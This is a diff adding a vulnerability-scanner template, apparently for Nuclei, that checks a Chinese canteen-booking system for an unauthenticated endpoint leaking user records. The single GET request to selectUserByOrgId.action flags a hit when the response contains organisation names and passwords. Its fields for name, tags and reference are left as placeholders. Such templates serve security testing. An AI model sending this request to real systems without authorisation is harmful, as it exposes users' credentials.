@@ -1,0 +1,25 @@
+id: styy-selectUserByOrgId-un
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 满客宝智慧食堂预定系统selectUserByOrgId未授权访问漏洞
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/yuding/selectUserByOrgId.action?record="
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'orgName'
+      - type: word
+        part: body
+        words:
+          - 'password'
